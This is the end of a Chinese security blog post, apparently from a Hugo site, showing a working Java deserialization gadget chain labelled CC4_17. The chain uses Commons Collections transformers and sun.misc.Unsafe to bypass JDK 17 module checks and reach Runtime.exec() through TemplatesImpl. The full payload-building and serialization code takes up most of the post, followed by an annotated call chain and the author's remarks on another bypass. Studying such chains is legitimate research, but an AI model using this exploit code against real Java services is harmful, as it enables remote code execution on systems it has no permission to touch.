+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">TrAXFilter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InstantiateTransformer</span><span class="w"> </span><span class="n">invokerTransformer5</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InstantiateTransformer</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Templates</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="n">templates</span><span class="p">});</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ConstantTransformer</span><span class="w"> </span><span class="n">constantTransformer2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">TrAXFilter</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getAndSetObject&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="kt">long</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&#34;</span><span class="p">),</span><span class="n">60</span><span class="p">,</span><span class="s">&#34;javax.xml&#34;</span><span class="p">});</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;get&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">});</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;setAccessible&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="kt">boolean</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">true</span><span class="p">});</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TransformerClosure</span><span class="w"> </span><span class="n">transformerClosure</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TransformerClosure</span><span class="p">(</span><span class="n">invokerTransformer2</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ClosureTransformer</span><span class="w"> </span><span class="n">ClosureTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ClosureTransformer</span><span class="p">(</span><span class="n">transformerClosure</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getDeclaredField&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;theUnsafe&#34;</span><span class="p">});</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ConstantTransformer</span><span class="w"> </span><span class="n">constantTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.misc.Unsafe&#34;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">transformers</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="n">constantTransformer</span><span class="p">,</span><span class="n">invokerTransformer</span><span class="p">,</span><span class="n">ClosureTransformer</span><span class="p">,</span><span class="n">invokerTransformer3</span><span class="p">,</span><span class="n">invokerTransformer4</span><span class="p">,</span><span class="n">constantTransformer2</span><span class="p">,</span><span class="n">invokerTransformer5</span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="w"> </span><span class="n">keyTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">transformers</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        patchModule(invokerTransformer.getClass(),aClass);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">TrAXFilter</span><span class="p">.</span><span class="na">getModule</span><span class="p">().</span><span class="na">getName</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">invokerTransformer</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getModule</span><span class="p">().</span><span class="na">getName</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TransformingComparator</span><span class="w"> </span><span class="n">transformingComparator</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TransformingComparator</span><span class="p">(</span><span class="n">keyTransformer</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">PriorityQueue</span><span class="w"> </span><span class="n">priorityQueue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">PriorityQueue</span><span class="p">(</span><span class="n">2</span><span class="p">,</span><span class="n">transformingComparator</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">patchModule</span><span class="p">(</span><span class="n">CC4_17</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">priorityQueue</span><span class="p">.</span><span class="na">getClass</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">priorityQueue</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;size&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">size</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">size</span><span class="p">.</span><span class="na">setInt</span><span class="p">(</span><span class="n">priorityQueue</span><span class="p">,</span><span class="w"> </span><span class="n">2</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileOutputStream</span><span class="w"> </span><span class="n">fos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">fos</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">priorityQueue</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 从文件中反序列化对象</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileInputStream</span><span class="w"> </span><span class="n">fis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="n">fis</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">patchModule</span><span class="p">(</span><span class="n">Class</span><span class="w"> </span><span class="n">clazz</span><span class="p">,</span><span class="n">Class</span><span class="w"> </span><span class="n">goalclass</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Class</span><span class="w"> </span><span class="n">UnsafeClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.misc.Unsafe&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Field</span><span class="w"> </span><span class="n">unsafeField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">UnsafeClass</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;theUnsafe&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">unsafeField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Unsafe</span><span class="w"> </span><span class="n">unsafe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Unsafe</span><span class="p">)</span><span class="n">unsafeField</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Object</span><span class="w"> </span><span class="n">ObjectModule</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="s">&#34;getModule&#34;</span><span class="p">).</span><span class="na">invoke</span><span class="p">(</span><span class="n">goalclass</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Class</span><span class="w"> </span><span class="n">currentClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">long</span><span class="w"> </span><span class="n">addr</span><span class="o">=</span><span class="n">unsafe</span><span class="p">.</span><span class="na">objectFieldOffset</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;module&#34;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">unsafe</span><span class="p">.</span><span class="na">getAndSetObject</span><span class="p">(</span><span class="n">currentClass</span><span class="p">,</span><span class="n">addr</span><span class="p">,</span><span class="n">ObjectModule</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setFiled</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">templates</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">values</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IllegalAccessException</span><span class="p">,</span><span class="w"> </span><span class="n">NoSuchFieldException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">declaredField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">templates</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="n">name</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">declaredField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">declaredField</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="n">values</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><h3 id="调用链">调用链<a hidden class="anchor" aria-hidden="true" href="#调用链">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">PriorityQueue</span><span class="p">.</span><span class="na">readObject</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">PriorityQueue</span><span class="p">.</span><span class="na">heapify</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">PriorityQueue</span><span class="p">.</span><span class="na">siftDown</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">PriorityQueue</span><span class="p">.</span><span class="na">siftDownUsingComparator</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="n">TransformingComparator</span><span class="p">.</span><span class="na">compare</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ChainedTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    		</span><span class="n">ConstantTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    		</span><span class="n">InvokerTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">()</span><span class="w">     </span><span class="o">---&gt;</span><span class="w"> </span><span class="n">这里开始构造Unsafe对象</span><span class="err">，</span><span class="n">得到Filed对象</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    			</span><span class="n">ClosureTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">()</span><span class="w"> </span><span class="o">---&gt;</span><span class="w"> </span><span class="n">这里形成一个岔路</span><span class="err">，</span><span class="n">去构造setAccessible</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    			</span><span class="n">TransformerClosure</span><span class="p">.</span><span class="na">transform</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    			</span><span class="n">InvokerTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">()</span><span class="w"> </span><span class="o">---&gt;</span><span class="w"> </span><span class="n">这里执行setAccessible</span><span class="err">，</span><span class="n">然后又回到主线</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    		</span><span class="n">InvokerTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">()</span><span class="w">     </span><span class="o">---&gt;</span><span class="w"> </span><span class="n">执行get</span><span class="p">()</span><span class="err">，</span><span class="n">得到Unsafe对象</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    		</span><span class="n">InvokerTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">()</span><span class="w">	   </span><span class="o">---&gt;</span><span class="w"> </span><span class="n">执行getAndSetObject</span><span class="err">，</span><span class="n">修改pn</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">ConstantTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">()</span><span class="w">    </span><span class="o">---&gt;</span><span class="n">这里回到正常CC4链子</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">InstantiateTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">newInstance</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">TrAXFilter</span><span class="err">#</span><span class="n">TrAXFilter</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">TemplatesImpl</span><span class="p">.</span><span class="na">newTransformer</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                         </span><span class="n">TemplatesImpl</span><span class="p">.</span><span class="na">getTransletInstance</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                         </span><span class="n">TemplatesImpl</span><span class="p">.</span><span class="na">defineTransletClasses</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                         </span><span class="nf">newInstance</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">Runtime</span><span class="p">.</span><span class="na">exec</span><span class="p">()</span><span class="w">
+</span></span></span></code></pre></div><h1 id="0x05-遗漏">0x05 遗漏<a hidden class="anchor" aria-hidden="true" href="#0x05-遗漏">#</a></h1>
+<p>写文章的时候看代码越看越感觉漏掉了什么，还记得我前面说到的一个利用尝试<code>&quot;null&quot;</code>，这个地方我分析的时候，把memberClass想成null了，其实不是，是<code>memberClass.getModule()</code>为<code>null</code></p>
+<p>那么有点感觉了么少年？我tm直接把这两个的<code>Moudle</code>都用Unsafe改成<code>null</code>呗，经过俺的改造，Unsafe对象调用两次完全不是问题啊</p>
+<p>感觉是可行的，但是我懒，俺要去吃饭了，都9点了才写完！！</p>
+<p><img loading="lazy" src="../images/image-20250110200548457.png" alt="image-20250110200548457"  />
+</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://Jiecub3.github.io/zh/posts/java/rmi-jep290/">
+    <span class="title">« 上一页</span>
+    <br>
+    <span>RMI JEP290</span>
+  </a>
+  <a class="next" href="https://Jiecub3.github.io/zh/posts/python/pickletypes.codetype%E5%AE%9E%E7%8E%B0%E6%8E%A5%E7%AE%A1%E4%BB%BB%E6%84%8F%E5%87%BD%E6%95%B0/">
+    <span class="title">下一页 »</span>
+    <br>
+    <span>pickle&amp;types.CodeType实现接管任意函数</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://Jiecub3.github.io/zh/">Jiecub3</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = '复制';
+
+        function copyingDone() {
+            copybutton.innerHTML = '已复制！';
+            setTimeout(() => {
+                copybutton.innerHTML = '复制';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
